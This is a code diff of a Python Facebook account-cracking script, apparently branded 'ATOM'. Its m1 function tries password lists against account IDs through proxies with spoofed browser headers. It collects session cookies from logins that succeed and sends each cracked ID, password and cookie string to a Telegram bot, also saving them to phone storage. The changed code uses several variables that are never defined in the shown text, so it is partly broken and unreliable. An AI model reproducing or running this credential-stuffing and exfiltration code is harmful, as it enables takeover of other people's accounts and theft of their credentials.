@@ -808,56 +808,50 @@ def m1(ids,pwv):
         for pas in pwv:
             free_fb = session.get('https://m.facebook.com').text
             info={
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             "try_number":"0",
             "unrecognized_tries":"0",
-            "email":ids,
-            "pass":pas,
+            "email":idf,
+            "pass":ps,
             "login":"Log In"}
             update={
-            'Host': 'm.facebook.com',
-            'Connection': 'keep-alive',
-            'Content-Length': str(len(str(info))),
+            'authority': 'm.facebook.com',
+            'method': 'GET',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'referer': 'https://m.facebook.com',
             'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-model': '"SM-G950FD"',
-            'sec-ch-ua-mobile': '?1',
-            'User-Agent': uger,
-            'viewport-width': '400',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'X-FB-LSD': 'AVr0Bh-X_bY',
-            'sec-ch-ua-platform-version': '"9.7.1"',
-            'X-ASBD-ID': '129477',
-            'dpr': '1.8',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua-platform': '"Android"',
-            'Accept': '*/*',
-            'Origin': 'https://m.facebook.com',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Dest': 'empty',
-            'Referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&_rdr',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'}
-            session.post(f'https://{fb}.facebook.com/login/device-based/regular/login/?',data=info,headers=update,proxies=proxies,allow_redirects=False).text
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
+            session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=info,headers=update,proxies=proxies).text
             log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
+            if 'c_user' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
-                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
-                res = requests.get(ckk).text
-                if 'Photoshop' in res:
-                        print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
-                        cek_apk(kuki)
-                        statusok = (f" {cid} | {pas} | {kuki} ")
-                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                        open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')                        
-                        oks.append(cid)
-                        break
+                if cid in oks:pass
+                else:
+                    if 'checkpoint' in str(lo):
+			    print(f'\r\r{P}[ATOM-2F]: {cid} | {pas}')
+                    else:
+                         print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
+                         print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
+                         cek_apk(kuki)
+                         statusok = (f" {cid} | {pas} | {coki} ")
+                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
+                         oks.append(cid)
+                         break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
@@ -870,7 +864,7 @@ def m1(ids,pwv):
             time.sleep(0.01)
         loop+=1
     except requests.exceptions.ConnectionError:
-        time.sleep(10)
+        time.sleep(30)
     except Exception as e:
         pass
 
@@ -2073,14 +2067,14 @@ def __MTDSIX__(ids, names, passlist, total_ids):
                 break
             elif "checkpoint" in log_cookies:
                 cps.append(ids)
-                print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
-                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
+                print(f'\r\r{rad}[ATOM-CP]{rad} {ids} {rad}| {pas}')
+                open('/sdcard/ATOM-CP.txt', 'a').write(ids + '|' + pas + '\n')
                 break
             else:
                 continue
         loop += 1
     except pycurl.error as e:
-        time.sleep(10)
+        time.sleep(50)
     except Exception as e:
         pass
 
